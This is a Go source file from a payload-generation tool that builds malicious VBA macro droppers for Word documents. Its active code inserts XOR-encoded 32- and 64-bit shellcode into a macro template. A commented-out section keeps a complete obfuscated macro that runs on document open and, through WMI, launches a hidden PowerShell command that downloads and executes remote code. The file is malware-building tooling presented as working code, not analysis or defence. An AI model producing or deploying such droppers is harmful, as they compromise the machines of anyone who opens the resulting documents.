package dropper

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	"text/template"

	"github.com/fachrioktavian/paychef/pkg/formatter"
)

type VBA struct {
	DropperType string
	FileName    string
	PayloadUrl  string
	OutFile     string
	Result      string
}

func NewVBA() *VBA {
	return &VBA{
		DropperType: DROPPER_TYPE_VBA,
		OutFile:     "",
	}
}

func (v *VBA) GetName() string {
	return v.DropperType
}

func (v *VBA) SetFileName(fileName string) {
	v.FileName = fileName
}

func (v *VBA) GetPayloadUrl() string {
	return v.PayloadUrl
}

func (v *VBA) SetPayloadUrl(payloadUrl string) {
	v.PayloadUrl = payloadUrl
}

func (v *VBA) SetOutFile(outFile string) {
	v.OutFile = outFile
}

func (v *VBA) GetResult() string {
	return v.Result
}

func (v *VBA) Render() error {
	xoredShellcodeFile64 := fmt.Sprintf(formatter.OUTPUT_FILE, formatter.AMD64_ARCH, formatter.ENCODE_XOR_MODE, formatter.VBA_FORMAT)
	xoredShellcodeFile32 := fmt.Sprintf(formatter.OUTPUT_FILE, formatter.X86_ARCH, formatter.ENCODE_XOR_MODE, formatter.VBA_FORMAT)

	if _, err := os.Stat(xoredShellcodeFile64); os.IsNotExist(err) {
		return fmt.Errorf("xored shellcode file for 64-bit architecture does not exist: %s", xoredShellcodeFile64)
	}
	if _, err := os.Stat(xoredShellcodeFile32); os.IsNotExist(err) {
		return fmt.Errorf("xored shellcode file for 32-bit architecture does not exist: %s", xoredShellcodeFile32)
	}

	xoredShellcodeFile64Content, err := os.ReadFile(xoredShellcodeFile64)
	if err != nil {
		return fmt.Errorf("failed to read xored shellcode file for 64-bit architecture: %w", err)
	}
	xoredShellcodeFile32Content, err := os.ReadFile(xoredShellcodeFile32)
	if err != nil {
		return fmt.Errorf("failed to read xored shellcode file for 32-bit architecture: %w", err)
	}

	tmp64 := strings.Split(string(xoredShellcodeFile64Content), "key = ")
	tmp32 := strings.Split(string(xoredShellcodeFile32Content), "key = ")
	buf64, key64 := tmp64[0], strings.TrimSpace(tmp64[1])
	buf32, key32 := tmp32[0], strings.TrimSpace(tmp32[1])
	
	if key64 != key32 {
		return fmt.Errorf("the key for 64-bit and 32-bit architectures does not match: %s != %s", key64, key32)
	}

	i, _ := strconv.ParseInt(key64, 10, 64)
	keyHex := fmt.Sprintf("%X", i)
	fmt.Println(key64, i, keyHex)

	vbaTemplateData := vbaTemplateData{
		XorKeyInHex: keyHex,
		Buf64:       buf64,
		Buf32:       buf32,
	}

	tmpl, _ := template.ParseFiles(TEMPLATE_FILE_VBA)
	var sb strings.Builder
	err = tmpl.Execute(&sb, vbaTemplateData)
	if err != nil {
		return fmt.Errorf("failed to execute template: %w", err)
	}
	v.Result = sb.String()
	return nil

	

	
	// payload := fmt.Sprintf(payloadTemplate, v.PayloadUrl)
	// obfContent := encodePayload(payload)
	// fileName := encodePayload(v.FileName)

	// t := template.Must(template.New("vba").Parse(vbaTemplate))

	// data := vbaTemplateData{
	// 	FileName:   fileName,
	// 	ObfContent: obfContent,
	// }

	// var sb strings.Builder
	// err := t.Execute(&sb, data)
	// if err != nil {
	// 	return fmt.Errorf("failed to execute template: %w", err)
	// }
	// v.Result = sb.String()
	// return nil
}

func (v *VBA) PrintResult() error {
	if v.OutFile != "" {
		err := os.WriteFile(v.OutFile, []byte(v.Result), 0644)
		if err != nil {
			return fmt.Errorf("failed to write result to file: %w", err)
		}
		fmt.Printf("Dropper generated successfully: %s\n", v.OutFile)
	} else {
		fmt.Println("Generated Dropper:\n<-------------------->")
		fmt.Println(v.Result)
	}

	err := os.WriteFile(OUTPUT_FILE, []byte(v.Result), 0644)
	if err != nil {
		return fmt.Errorf("failed to write result to default output file: %w", err)
	}

	return nil
}

// func encodePayload(payload string) string {
// 	var sb strings.Builder
// 	for _, r := range payload {
// 		obfVal := int(r) + 17
// 		sb.WriteString(
// 			// zero-pad to 3 digits
// 			strconv.Itoa(obfVal/100%10) + strconv.Itoa(obfVal/10%10) + strconv.Itoa(obfVal%10),
// 		)
// 	}
// 	return sb.String()
// }

type vbaTemplateData struct {
	XorKeyInHex string
	Buf64   string
	Buf32   string
}

// type vbaTemplateData struct {
// 	FileName   string
// 	ObfContent string
// }

// const payloadTemplate = `
// powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('%s'))
// `

// const vbaTemplate = `
// Function Pears(Beets)
//    Pears = Chr(Beets - 17)
// End Function


// Function Strawberries(Grapes)
//    Strawberries = Left(Grapes, 3)
// End Function


// Function Almonds(Jelly)
//    Almonds = Right(Jelly, Len(Jelly) - 3)
// End Function


// Function Nuts(Milk)
//    Do
//        Oatmilk = Oatmilk + Pears(Strawberries(Milk))
//        Milk = Almonds(Milk)
//    Loop While Len(Milk) > 0
//    Nuts = Oatmilk
// End Function


// Function MyMacro()
//    If ActiveDocument.Name <> Nuts("{{.FileName}}") Then
//        Exit Function
//    End If


//    Dim Apples As String
//    Dim Water As String


//    Apples = "{{.ObfContent}}"
//    Water = Nuts(Apples)
//    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
// End Function


// Sub Document_Open()
//    MyMacro
// End Sub


// Sub AutoOpen()
//    MyMacro
// End Sub
// `

const (
	DROPPER_TYPE_VBA = "VBA"
	TEMPLATE_FILE_VBA = "templates/MacroWordInjectXor.vbs"
	OUTPUT_FILE = "assets/dropper-macro-vba.vbs"
)
